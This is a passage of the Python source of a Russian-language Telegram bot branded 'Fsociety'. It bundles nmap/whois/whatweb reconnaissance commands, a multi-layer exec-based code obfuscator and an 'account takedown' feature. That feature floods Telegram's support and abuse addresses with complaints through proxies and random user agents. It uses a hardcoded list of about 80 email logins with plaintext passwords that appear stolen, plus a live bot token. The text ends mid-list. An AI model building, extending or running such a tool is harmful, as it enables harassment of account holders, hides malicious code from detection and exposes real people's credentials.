#!/usr/bin/env python3
import os
import asyncio
import logging
import subprocess
import socket
import random
import string
import time
import smtplib
import requests
import aiosqlite
import ipaddress
import base64
import marshal
import zlib
import re
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from fake_useragent import UserAgent
from typing import List, Dict, Optional

from aiogram import Bot, Dispatcher, F, BaseMiddleware
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, FSInputFile, Sticker
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# CONFIG
BOT_TOKEN = "8433576899:AAGJ5tianUDf9TrfLMSvEAj1ZEavLNTXy0U"
CHANNEL_USERNAME = "@Fsadapter"
ADMIN_IDS = [8018711407]

DB_NAME = "bot_database.db"

# Папка для файлов
FILES_DIR = "files"
STICKERS_DIR = "stickers"

# Создаем папки если их нет
os.makedirs(FILES_DIR, exist_ok=True)
os.makedirs(STICKERS_DIR, exist_ok=True)

PROXIES_LIST = [
    '8.218.149.193:80', '47.57.233.126:80', '47.243.70.197:80', '8.222.193.208:80',
    '144.24.85.158:80', '47.245.115.6:80', '47.245.114.163:80', '45.4.55.10:40486',
    '103.52.37.1:4145', '200.34.227.204:4153', '190.109.74.1:33633'
]

# EMAIL DATA
senders = {
    'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
    'aria.therese.svensson@mail.com': 'Zorro1ab',
    'taterbug@verizon.net': 'Holly1!',
    'ejbrickner@comcast.net': 'Pass1178',
    'teressapeart@cox.net': 'Quinton2329!',
    'liznees@verizon.net': 'Dancer008',
    'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
    'kcdg@charter.net': 'Jennifer3*',
    'bean_118@hotmail.com': 'Liverpool118!',
    'dsdhjas@mail.com': 'LONGHACH123',
    'robitwins@comcast.net': 'May241996',
    'wasina@live.com': 'Marlas21',
    'aruzhan.01@mail.com': '1234567!',
    'rob.tackett@live.com': 'metallic',
    'lindahallenbeck@verizon.net': 'Anakin@2014',
    'hlaw82@mail.com': 'Snoopy37$$',
    'paintmadman@comcast.net': 'mycat2200*',
    'prideandjoy@verizon.net': 'Ihatejen12',
    'sdgdfg56@mail.com': 'kenwood4201',
    'garrett.danelz@comcast.net': 'N11golfer!',
    'gillian_1211@hotmail.com': 'Gilloveu1211',
    'sunpit16@hotmail.com': 'Putter34!',
    'fdshelor@verizon.net': 'Masco123*',
    'yeags1@cox.net': 'Zoomom1965!',
    'amine002@usa.com': 'iScrRoXAei123',
    'bbarcelo16@cox.net': 'Bsb161089$$',
    'laliebert@hotmail.com': 'pirates2',
    'vallen285@comcast.net': 'Delft285!1!',
    'sierra12@email.com': 'tegen1111',
    'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
    'kmay@windstream.net': 'Nascar98',
    'redbrick1@mail.com': 'Redbrick11',
    'ivv9ah7f@mail.com': 'K226nw8duwg',
    'erkobir@live.com': 'floydLAWTON019',
    'Misscarter@mail.com': 'ashtray19',
    'carlieruby10@cox.net': 'Lollypop789$',
    'blackops2013@mail.com': 'amason123566',
    'caroline_cullum@comcast.net': 'carter14',
    'dpb13@live.com': 'Ic&ynum13',
    'heirhunter@usa.com': 'Noguys@714',
    'sherri.edwards@verizon.net': 'Dreaming123#',
    'rami.rami1980@hotmail.com': 'ramirami1980',
    'jmsingleton2@comcast.net': '151728Jn$$',
    'aberancho@aol.com': '10diegguuss10',
    'dgidel@iowatelecom.net': 'Buster48',
    'gpopandopul@mail.com': 'GEORG62A',
    'bolgodonsk@mail.com': '012345678!',
    'colbycolb@cox.net': 'Signals@1',
    'nicrey4@comcast.net': 'Dabears54',
    'mordechai@mail.com': 'Mordechai',
    'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
    'tarabedford@comcast.net': 'Money4me',
    'mycockneedsit@mail.com': 'benjamin3',
    'saralaine@mail.com': 'sarlaine12!1',
    'jonb2006@verizon.net': '1969Camaro',
    'rjhssa1@verizon.net': 'Donna613*',
    'cameron.doug@charter.net': 'Jake2122$',
    'bridget.shappell@comcast.net': 'Brennan1',
    'rugs8@comcast.net': 'baseball46',
    'averyjacobs3@mail.com': '1960682644!',
    'lstefanick@hotmail.com': 'Luv2dance2',
    'bchavez123@mail.com': 'aadrianachavez',
    'lukejamesjones@mail.com': 'tinkerbell1',
    'emahoney123@comcast.net': 'Shieknmme3#',
    'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
    'jet747@cox.net': 'Sadie@1234',
    'landsgascareservices@mail.com': 'Alisha25@',
    'samantha224@mail.com': 'Madden098!@',
    'kbhamil@wowway.com': 'Carol1940',
    'email@bjasper.com': 'Lhsnh4us123!',
    'biggsbrian@cox.net': 'Trains@2247Trains@2247',
    'dzzeblnd@aol.com': 'Geosgal@1',
    'jtrego@indy.rr.com': 'Jackwill14!',
    'chrisphonte.rj@comcast.net': 'Junior@3311',
    'tvwifiguy@comcast.net': 'Bill#0101',
    'defenestrador@mail.com': 'm0rb1d8ss',
    'glangley@gmx.com': 'ironhide',
    'charlotte2850@hotmail.com': 'kelalu2850'
}

receivers = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org'
]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BroadcastStates(StatesGroup):
    waiting_for_message = State()

class ObfuscatorStates(StatesGroup):
    waiting_for_file = State()
    waiting_for_method = State()
    waiting_for_loops = State()

class ScanStates(StatesGroup):
    waiting_for_target = State()

storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

class Database:
    def __init__(self, db_name: str = DB_NAME):
        self.db_name = db_name
        self.initialized = False
    
    async def init_db(self):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    is_subscribed INTEGER DEFAULT 0,
                    join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS command_stats (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    command TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS broadcasts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    admin_id INTEGER,
                    message_text TEXT,
                    sent_count INTEGER DEFAULT 0,
                    failed_count INTEGER DEFAULT 0,
                    sent_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS ip_scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    ip_address TEXT,
                    scan_result TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS obfuscations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    original_file TEXT,
                    obfuscated_file TEXT,
                    method INTEGER,
                    loops INTEGER,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS website_scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    target TEXT,
                    whois_result TEXT,
                    nslookup_result TEXT,
                    dig_result TEXT,
                    whatweb_result TEXT,
                    nmap_result TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            await conn.commit()
            self.initialized = True
    
    async def add_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, join_date)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (user_id, username, first_name, last_name))
            await conn.commit()
    
    async def update_user_activity(self, user_id: int):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                UPDATE users SET last_activity = CURRENT_TIMESTAMP WHERE user_id = ?
            ''', (user_id,))
            await conn.commit()
    
    async def update_subscription(self, user_id: int, is_subscribed: bool):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                UPDATE users SET is_subscribed = ? WHERE user_id = ?
            ''', (1 if is_subscribed else 0, user_id))
            await conn.commit()
    
    async def get_user(self, user_id: int) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_name) as conn:
            conn.row_factory = aiosqlite.Row
            cursor = await conn.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
            row = await cursor.fetchone()
            return dict(row) if row else None
    
    async def get_all_users(self) -> List[Dict]:
        async with aiosqlite.connect(self.db_name) as conn:
            conn.row_factory = aiosqlite.Row
            cursor = await conn.execute('SELECT * FROM users ORDER BY last_activity DESC')
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def get_active_users(self, days: int = 30) -> List[Dict]:
        async with aiosqlite.connect(self.db_name) as conn:
            conn.row_factory = aiosqlite.Row
            cursor = await conn.execute('''
                SELECT * FROM users 
                WHERE last_activity > datetime('now', ?)
                ORDER BY last_activity DESC
            ''', (f'-{days} days',))
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def get_subscribed_users(self) -> List[Dict]:
        async with aiosqlite.connect(self.db_name) as conn:
            conn.row_factory = aiosqlite.Row
            cursor = await conn.execute('''
                SELECT * FROM users 
                WHERE is_subscribed = 1 
                ORDER BY last_activity DESC
            ''')
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def count_users(self) -> int:
        async with aiosqlite.connect(self.db_name) as conn:
            cursor = await conn.execute('SELECT COUNT(*) as count FROM users')
            row = await cursor.fetchone()
            return row[0] if row else 0
    
    async def count_active_users(self, days: int = 30) -> int:
        async with aiosqlite.connect(self.db_name) as conn:
            cursor = await conn.execute('''
                SELECT COUNT(*) as count FROM users 
                WHERE last_activity > datetime('now', ?)
            ''', (f'-{days} days',))
            row = await cursor.fetchone()
            return row[0] if row else 0
    
    async def count_subscribed(self) -> int:
        async with aiosqlite.connect(self.db_name) as conn:
            cursor = await conn.execute('''
                SELECT COUNT(*) as count FROM users 
                WHERE is_subscribed = 1
            ''')
            row = await cursor.fetchone()
            return row[0] if row else 0
    
    async def log_command(self, user_id: int, command: str):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO command_stats (user_id, command)
                VALUES (?, ?)
            ''', (user_id, command))
            await conn.commit()
    
    async def get_top_commands(self, limit: int = 10) -> List[Dict]:
        async with aiosqlite.connect(self.db_name) as conn:
            conn.row_factory = aiosqlite.Row
            cursor = await conn.execute('''
                SELECT command, COUNT(*) as count 
                FROM command_stats 
                GROUP BY command 
                ORDER BY count DESC 
                LIMIT ?
            ''', (limit,))
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def save_broadcast(self, admin_id: int, message_text: str, sent_count: int, failed_count: int = 0):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO broadcasts (admin_id, message_text, sent_count, failed_count)
                VALUES (?, ?, ?, ?)
            ''', (admin_id, message_text, sent_count, failed_count))
            await conn.commit()
    
    async def get_broadcast_stats(self) -> List[Dict]:
        async with aiosqlite.connect(self.db_name) as conn:
            conn.row_factory = aiosqlite.Row
            cursor = await conn.execute('''
                SELECT 
                    admin_id,
                    COUNT(*) as total_broadcasts,
                    SUM(sent_count) as total_sent,
                    SUM(failed_count) as total_failed,
                    MAX(sent_date) as last_broadcast
                FROM broadcasts 
                GROUP BY admin_id
                ORDER BY last_broadcast DESC
            ''')
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def save_ip_scan(self, user_id: int, ip_address: str, scan_result: str):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO ip_scans (user_id, ip_address, scan_result)
                VALUES (?, ?, ?)
            ''', (user_id, ip_address, scan_result))
            await conn.commit()
    
    async def save_obfuscation(self, user_id: int, original_file: str, obfuscated_file: str, method: int, loops: int):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO obfuscations (user_id, original_file, obfuscated_file, method, loops)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, original_file, obfuscated_file, method, loops))
            await conn.commit()
    
    async def save_website_scan(self, user_id: int, target: str, whois_result: str = None, nslookup_result: str = None,
                                dig_result: str = None, whatweb_result: str = None, nmap_result: str = None):
        async with aiosqlite.connect(self.db_name) as conn:
            await conn.execute('''
                INSERT INTO website_scans (user_id, target, whois_result, nslookup_result, dig_result, whatweb_result, nmap_result)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (user_id, target, whois_result, nslookup_result, dig_result, whatweb_result, nmap_result))
            await conn.commit()

db = Database()

# Функции обфускации
def zlb_compress(data):
    return zlib.compress(data)

def b16_encode(data):
    return base64.b16encode(data)

def b32_encode(data):
    return base64.b32encode(data)

def b64_encode(data):
    return base64.b64encode(data)

def marshal_compile(data):
    return marshal.dumps(compile(data, "<x>", "exec"))

def obfuscate_code(data: str, method: int, loops: int = 1) -> str:
    encoding_functions = {
        1: (
            "marshal_compile(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__[::-1]);",
        ),
        2: (
            "zlb_compress(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('zlib').decompress(__[::-1]);",
        ),
        3: (
            "b16_encode(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('base64').b16decode(__[::-1]);",
        ),
        4: (
            "b32_encode(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('base64').b32decode(__[::-1]);",
        ),
        5: (
            "b64_encode(data.encode('utf8'))[::-1]",
            "_ = lambda __ : __import__('base64').b64decode(__[::-1]);",
        ),
        6: (
            "b16_encode(zlb_compress(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));",
        ),
        7: (
            "b32_encode(zlb_compress(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));",
        ),
        8: (
            "b64_encode(zlb_compress(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));",
        ),
        9: (
            "zlb_compress(marshal_compile(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));",
        ),
        10: (
            "b16_encode(marshal_compile(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));",
        ),
        11: (
            "b32_encode(marshal_compile(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('base64').b32decode(__[::-1]));",
        ),
        12: (
            "b64_encode(marshal_compile(data.encode('utf8')))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));",
        ),
        13: (
            "b16_encode(zlb_compress(marshal_compile(data.encode('utf8'))))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])));",
        ),
        14: (
            "b32_encode(zlb_compress(marshal_compile(data.encode('utf8'))))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));",
        ),
        15: (
            "b64_encode(zlb_compress(marshal_compile(data.encode('utf8'))))[::-1]",
            "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));",
        ),
    }

    if method not in encoding_functions:
        raise ValueError("Неправильный метод обфускации")

    xx, heading = encoding_functions[method]
    result = data

    for _ in range(loops):
        try:
            result = "exec((_)(%s))" % repr(eval(xx.replace('data', 'result')))
        except Exception as e:
            raise TypeError(f"Ошибка обфускации: {str(e)}")

    return heading + result

def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"

def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_phone_number():
    country_codes = ['+7', '+1', '+44', '+49', '+33', '+86', '+91', '+55']
    country_code = random.choice(country_codes)
    srv = ['927', '937', '993', '952', '950', '926', '918']
    srv_code = random.choice(srv)
    phone_number = ''.join(random.choices('0123456789', k=7))
    return f'{country_code}{srv_code}{phone_number}'

def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(1)
        server.quit()
        return True
    except Exception as e:
        return False

def send_complaint(username, telegram_id, number, email, repeats, complaint_text, proxies=None):
    url = 'https://telegram.org/support'
    user_agent = UserAgent().random
    headers = {'User-Agent': user_agent}
    complaints_sent = 0
    
    payload = {'text': complaint_text, 'number': number, 'email': email}
    
    try:
        for _ in range(int(repeats)):
            response = requests.post(url, headers=headers, data=payload, proxies=proxies)
            if response.status_code == 200:
                complaints_sent += 1
    except Exception as e:
        pass
    return complaints_sent

async def check_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
    except Exception as e:
        logger.error(f"Error checking subscription: {e}")
        return False

class UserActivityMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        if isinstance(event, (Message, CallbackQuery)):
            user = event.from_user
            if not db.initialized:
                await db.init_db()
            
            await db.add_user(
                user_id=user.id,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name
            )
            await db.update_user_activity(user.id)
        return await handler(event, data)

dp.message.middleware(UserActivityMiddleware())
dp.callback_query.middleware(UserActivityMiddleware())

async def main_menu() -> tuple[str, InlineKeyboardMarkup]:
    try:
        total_users = await db.count_users()
        active_users = await db.count_active_users(7)
        stats_text = f"Пользователей: {total_users} | Активных: {active_users}"
    except Exception as e:
        logger.error(f"Error getting stats: {e}")
        stats_text = "Статистика загружается..."
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Сканирование сайта", callback_data="menu_scan")],
        [InlineKeyboardButton(text="Полезное", callback_data="useful_menu")],
        [InlineKeyboardButton(text="Помощь", callback_data="help")],
        [InlineKeyboardButton(text="Наш канал", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]
    ])
    return stats_text, keyboard

def admin_menu() -> InlineKeyboardMarkup:
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Рассылка сообщений", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="Детальная статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="Управление пользователями", callback_data="admin_users")],
        [InlineKeyboardButton(text="Назад в меню", callback_data="menu_main")]
    ])
    return keyboard

# Функции для сканирования сайтов
def validate_domain(domain):
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$'
    ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    
    if re.match(domain_pattern, domain) or re.match(ip_pattern, domain):
        return True
    return False

async def run_command_safe(cmd):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout if result.stdout else result.stderr
    except subprocess.TimeoutExpired:
        return "Команда выполнялась слишком долго (таймаут 30 секунд)"
    except Exception as e:
        return f"Ошибка выполнения команды: {str(e)}"

@dp.message(Command("start", "menu"))
async def start_cmd(message: Message):
    user_id = message.from_user.id
    
    if not await check_subscription(user_id):
        await message.answer(
            f"Для использования бота необходимо подписаться на наш канал!\n\n"
            f"Канал: {CHANNEL_USERNAME}\n"
            f"После подписки нажмите кнопку ниже:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Я подписался", callback_data="check_subscription")],
                [InlineKeyboardButton(text="Перейти в канал", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]
            ])
        )
        return
    
    await db.update_subscription(user_id, True)
    stats_text, keyboard = await main_menu()
    
    text = f"""
Добро пожаловать в бота Fsociety!
Ваш ID: {user_id} 

{stats_text}
Выберите раздел :
"""
    await message.answer(text, reply_markup=keyboard)

@dp.callback_query(F.data == "check_subscription")
async def check_subscription_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    if await check_subscription(user_id):
        await db.update_subscription(user_id, True)
        stats_text, keyboard = await main_menu()
        
        text = f"""
Спасибо за подписку!

Теперь вы можете использовать все функции бота.

{stats_text}

Выберите раздел:
"""
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer(
            "Вы еще не подписались на канал!",
            show_alert=True
        )

@dp.callback_query(F.data == "menu_main")
async def main_menu_callback(callback: CallbackQuery):
    stats_text, keyboard = await main_menu()
    
    text = f"""
Главное меню 

{stats_text}

Выберите раздел:
"""
    await callback.message.edit_text(text, reply_markup=keyboard)

@dp.callback_query(F.data == "show_stats")
async def show_stats_callback(callback: CallbackQuery):
    try:
        total_users = await db.count_users()
        active_users = await db.count_active_users(7)
        subscribed_users = await db.count_subscribed()
        
        top_commands = await db.get_top_commands(5)
        commands_text = "\n".join([f"• {cmd['command']}: {cmd['count']}" for cmd in top_commands])
    except Exception as e:
        logger.error(f"Error getting stats: {e}")
        total_users = active_users = subscribed_users = 0
        commands_text = "• Статистика недоступна"
    
    stats_text = f"""
Статистика бота

Пользователи:
• Всего пользователей: {total_users}
• Активных (7 дней): {active_users}
• Подписанных: {subscribed_users}

Популярные команды:
{commands_text}

Система:
• Прокси в базе: {len(PROXIES_LIST)}
• Email аккаунтов: {len(senders)}
"""
    await callback.message.edit_text(
        stats_text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Обновить", callback_data="show_stats")],
            [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
        ])
    )

@dp.callback_query(F.data == "help")
async def help_callback(callback: CallbackQuery):
    help_text = """
Помощь по использованию бота

Основные функции:
1. Сканирование сайтов - DNS, WHOIS, порты, технологии
2. Снос - жалобы, флуд
3. Обфускатор - шифрование Python кода
4. Стикеры - отправка стикеров из папки
5. Файлы - скачивание файлов
6. Полезное - сканирование IP, генераторы и утилиты

Поддержка:
Если возникли проблемы - обратитесь к администратору @Fopercode
"""
    await callback.message.edit_text(
        help_text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
        ])
    )

@dp.callback_query(F.data == "useful_menu")
async def useful_menu_callback(callback: CallbackQuery):
    useful_text = """
Полезное меню

Доступные функции:

Сканирование IP:
• Просто отправьте IP адрес или домен для сканирования
• Примеры: 8.8.8.8, google.com, 192.168.1.1

Генераторы данных:
• /generate_email [кол-во] - Email адреса
• /generate_phone [кол-во] - Номера телефонов
• /generate_pass [длина] [кол-во] - Пароли

Утилиты:
• /check_port IP порт - Проверка порта
• /myinfo - Ваша информация
• /stats - Статистика бота

Примеры:
/generate_email 5
/generate_phone 3
/generate_pass 12 3
/check_port 8.8.8.8 80
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Обфускатор", callback_data="menu_obfuscator")],
        [InlineKeyboardButton(text="Снос Аккаунта", callback_data="menu_attack")],
        [InlineKeyboardButton(text="Файлы", callback_data="menu_files")],
        [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
    ])
    
    await callback.message.edit_text(useful_text, reply_markup=keyboard)

@dp.callback_query(F.data == "menu_scan")
async def scan_menu_callback(callback: CallbackQuery):
    text = """
Сканирование сайта

Доступные команды:

/nslookup domain.com - DNS записи
/whois domain.com - WHOIS информация
/dig domain.com - Подробная DNS информация
/whatweb domain.com - Информация о веб-сервере
/nmap domain.com - Сканирование портов 
/allscan domain.com - Полное сканирование

Примеры:
/nslookup google.com
/whois google.com
/dig google.com
/whatweb google.com
/nmap google.com
/allscan google.com
"""
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="menu_main")]]
    ))

@dp.message(Command("whois"))
async def whois_cmd(message: Message):
    await db.log_command(message.from_user.id, "whois")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /whois domain.com")
        return
    
    domain = args[1].strip().lower()
    
    if not validate_domain(domain):
        await message.answer("Неверный формат домена или IP-адреса")
        return
    
    await message.answer(f"Получаю WHOIS информацию для {domain}...")
    
    result = await run_command_safe(f"whois {domain}")
    
    if len(result) > 4000:
        result = result[:4000] + "\n\n... (вывод обрезан)"
    
    await db.save_website_scan(
        user_id=message.from_user.id,
        target=domain,
        whois_result=result[:1000]
    )
    
    await message.answer(f"WHOIS для {domain}:\n```\n{result}\n```", parse_mode='Markdown')

@dp.message(Command("nslookup"))
async def nslookup_cmd(message: Message):
    await db.log_command(message.from_user.id, "nslookup")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /nslookup domain.com")
        return
    
    domain = args[1].strip().lower()
    
    if not validate_domain(domain):
        await message.answer("Неверный формат домена или IP-адреса")
        return
    
    await message.answer(f"Выполняю NSLOOKUP для {domain}...")
    
    result = await run_command_safe(f"nslookup {domain}")
    
    if len(result) > 4000:
        result = result[:4000] + "\n\n... (вывод обрезан)"
    
    await db.save_website_scan(
        user_id=message.from_user.id,
        target=domain,
        nslookup_result=result[:1000]
    )
    
    await message.answer(f"NSLOOKUP для {domain}:\n```\n{result}\n```", parse_mode='Markdown')

@dp.message(Command("dig"))
async def dig_cmd(message: Message):
    await db.log_command(message.from_user.id, "dig")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /dig domain.com")
        return
    
    domain = args[1].strip().lower()
    
    if not validate_domain(domain):
        await message.answer("Неверный формат домена или IP-адреса")
        return
    
    await message.answer(f"Выполняю DIG для {domain}...")
    
    result = await run_command_safe(f"dig {domain} ANY +short")
    
    if not result.strip():
        result = "Нет информации или домен не найден"
    
    if len(result) > 4000:
        result = result[:4000] + "\n\n... (вывод обрезан)"
    
    await db.save_website_scan(
        user_id=message.from_user.id,
        target=domain,
        dig_result=result[:1000]
    )
    
    await message.answer(f"DIG запрос для {domain}:\n```\n{result}\n```", parse_mode='Markdown')

@dp.message(Command("whatweb"))
async def whatweb_cmd(message: Message):
    await db.log_command(message.from_user.id, "whatweb")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /whatweb domain.com")
        return
    
    domain = args[1].strip().lower()
    
    if not validate_domain(domain):
        await message.answer("Неверный формат домена или IP-адреса")
        return
    
    await message.answer(f"Сканирую веб-сервер {domain}...")
    
    target_domain = domain
    if not target_domain.startswith(('http://', 'https://')):
        target_domain = 'http://' + target_domain
    
    result = await run_command_safe(f"whatweb {target_domain} --color=never")
    
    if len(result) > 4000:
        result = result[:4000] + "\n\n... (вывод обрезан так как слишком большой)"
    
    await db.save_website_scan(
        user_id=message.from_user.id,
        target=domain,
        whatweb_result=result[:1000]
    )
    
    await message.answer(f"WHATWEB для {domain}:\n```\n{result}\n```", parse_mode='Markdown')

@dp.message(Command("nmap"))
async def nmap_cmd(message: Message):
    await db.log_command(message.from_user.id, "nmap")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /nmap domain.com")
        return
    
    domain = args[1].strip().lower()
    
    if not validate_domain(domain):
        await message.answer("Неверный формат домена или IP-адреса")
        return
    
    await message.answer(f"Сканирую основные порты {domain} (это может занять время)...")
    
    result = await run_command_safe(f"nmap -F {domain}")
    
    if len(result) > 4000:
        result = result[:4000] + "\n\n... (вывод обрезан)"
    
    await db.save_website_scan(
        user_id=message.from_user.id,
        target=domain,
        nmap_result=result[:1000]
    )
    
    await message.answer(f"NMAP сканирование {domain}:\n```\n{result}\n```", parse_mode='Markdown')

@dp.message(Command("allscan"))
async def allscan_cmd(message: Message):
    await db.log_command(message.from_user.id, "allscan")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /allscan domain.com")
        return
    
    domain = args[1].strip().lower()
    
    if not validate_domain(domain):
        await message.answer("Неверный формат домена или IP-адреса")
        return
    
    await message.answer(f"Начинаю полное сканирование {domain}...")
    
    commands = [
        ("WHOIS", f"whois {domain}"),
        ("NSLOOKUP", f"nslookup {domain}"),
        ("DIG", f"dig {domain} ANY +short"),
